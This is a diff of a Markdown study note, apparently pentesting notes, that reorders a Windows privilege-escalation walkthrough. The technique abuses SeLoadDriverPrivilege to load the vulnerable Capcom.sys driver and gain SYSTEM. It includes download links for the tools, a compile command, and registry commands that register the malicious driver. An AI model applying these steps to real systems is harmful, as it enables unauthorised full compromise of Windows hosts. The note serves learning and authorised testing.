@@ -1,6 +1,7 @@
 ### Content
 
 - [Overview](#overview)
+- [Enabling SeLoadDriverPrivilege](#enabling-seloaddriverprivilege)
 - [Capcom Driver Abuse](#capcom-driver-abuse)
 	- [The Long Way](#the-long-way)
 	- [ExploitCapcom](#exploitcapcom)
@@ -20,15 +21,11 @@
 > Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group.
 
 ---
-### Capcom Driver Abuse
+#### Enabling SeLoadDriverPrivilege
 
-The driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.
-We can use our privilege `SeLoadDriverPrivilege` to load this vulnerable driver and escalate privileges.
+> Check [Notes](%2E%2E/Notes.md#Enabling%20Disabled%20Privileges) for another way to enable the disabled privileges.
 
-#### The Long Way
-
-Use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver.
-Before using it add those headers:
+Use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to enable `SeLoadDriverPrivilege`  to be able to load the driver and add those headers at first:
 
 ```C
 #include <windows.h>
@@ -45,6 +42,20 @@ Compile it using Visual Studio Developer Prompt.
 C:\>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
 ```
 
+Run the `EnableSeLoadDriverPrivilege.exe` binary.
+
+```CMD
+C:\> EnableSeLoadDriverPrivilege.exe
+```
+
+---
+### Capcom Driver Abuse
+
+The driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.
+We can use our privilege `SeLoadDriverPrivilege` to load this vulnerable driver and escalate privileges.
+
+#### The Long Way
+
 Download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`.
 Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
 
@@ -55,20 +66,7 @@ C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 
 > The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.
 
-Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
-
-```PowerShell
-PS C:\> .\DriverView.exe /stext drivers.txt
-PS C:\> cat drivers.txt | Select-String -pattern Capcom
-```
-
-Run the `EnableSeLoadDriverPrivilege.exe` binary.
-
-```CMD
-C:\> EnableSeLoadDriverPrivilege.exe
-```
-
-Verify that the Capcom driver is now listed.
+Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), verify that the Capcom driver is now listed.
 
 ```PowerShell
 PS C:\> .\DriverView.exe /stext drivers.txt
